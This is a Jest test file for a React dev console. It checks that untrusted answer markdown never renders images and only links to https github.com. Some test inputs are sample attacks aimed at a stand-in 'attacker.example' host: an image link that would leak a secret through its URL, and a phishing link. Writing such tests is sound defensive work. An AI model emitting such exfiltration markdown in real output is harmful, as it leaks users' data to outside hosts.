/**
 * @jest-environment jsdom
 *
 * Answer markdown is untrusted: no <img> may ever be emitted (a zero-click
 * fetch to any host), and links render only for https github.com.
 */
import type { ComponentType, ReactNode } from "react";
import { render, screen } from "@testing-library/react";

import { JobEventRow } from "@/pages/super-admin/dev-console/JobEvents";
import { SafeImg, SafeLink } from "@/pages/super-admin/dev-console/SafeMarkdown";

jest.mock("react-i18next", () => jest.requireActual("@/test/devConsoleI18nMock").reactI18nextMock);

/**
 * react-markdown is ESM that Jest does not transform. This stand-in parses the
 * two constructs that matter (images and links) and, exactly like the real
 * library, renders a NATIVE <img>/<a> unless `components` overrides it. So
 * dropping an override from SafeMarkdown makes the native element appear.
 */
jest.mock("react-markdown", () => ({
  __esModule: true,
  default: ({
    children,
    components = {},
  }: {
    children: string;
    components?: Record<string, ComponentType<Record<string, unknown>>>;
  }) => {
    const parts: ReactNode[] = [];
    const re = /(!?)\[([^\]]*)\]\(([^)]+)\)/g;
    let last = 0;
    let m: RegExpExecArray | null;
    let i = 0;
    while ((m = re.exec(children))) {
      parts.push(children.slice(last, m.index));
      const [, bang, text, url] = m;
      if (bang) {
        const Img = components.img;
        parts.push(Img ? <Img key={i++} alt={text} src={url} /> : <img key={i++} alt={text} src={url} />);
      } else {
        const A = components.a;
        parts.push(A ? <A key={i++} href={url}>{text}</A> : <a key={i++} href={url}>{text}</a>);
      }
      last = re.lastIndex;
    }
    parts.push(children.slice(last));
    return <div data-testid="markdown">{parts}</div>;
  },
}));
jest.mock("remark-gfm", () => ({ __esModule: true, default: () => undefined }));

const GH = "https://github.com/example-org/repo-private/blob/0123456789abcdef0123456789abcdef01234567/a.py#L1";

function renderAnswer(markdown: string) {
  return render(<JobEventRow event={{ seq: 1, ts: "t", type: "answer", markdown, citations: [] }} />);
}

describe("answer markdown is rendered safely", () => {
  it("an image produces no <img> element and makes no request", () => {
    const { container } = renderAnswer("see ![leak](https://attacker.example/x?d=SECRET) here");
    expect(container.querySelector("img")).toBeNull();
    // shown as text instead
    expect(screen.getByText(/\[image: leak\] https:\/\/attacker\.example\/x\?d=SECRET/)).toBeInTheDocument();
  });

  it("an off-github link produces no <a>", () => {
    const { container } = renderAnswer("go [here](https://attacker.example/phish) now");
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText(/here/)).toBeInTheDocument();
  });

  it("an http github link produces no <a>", () => {
    const { container } = renderAnswer("[x](http://github.com/example-org/repo-private)");
    expect(container.querySelector("a")).toBeNull();
  });

  it("a github link still renders", () => {
    renderAnswer(`read [the resolver](${GH})`);
    const link = screen.getByRole("link", { name: "the resolver" });
    expect(link).toHaveAttribute("href", GH);
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });
});

describe("SafeImg / SafeLink directly", () => {
  it("SafeImg never renders an img", () => {
    const { container } = render(<SafeImg src="https://github.com/x.png" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("[image] https://github.com/x.png");
  });

  it("SafeLink with no href renders text", () => {
    const { container } = render(<SafeLink>plain</SafeLink>);
    expect(container.querySelector("a")).toBeNull();
    expect(container).toHaveTextContent("plain");
  });
});
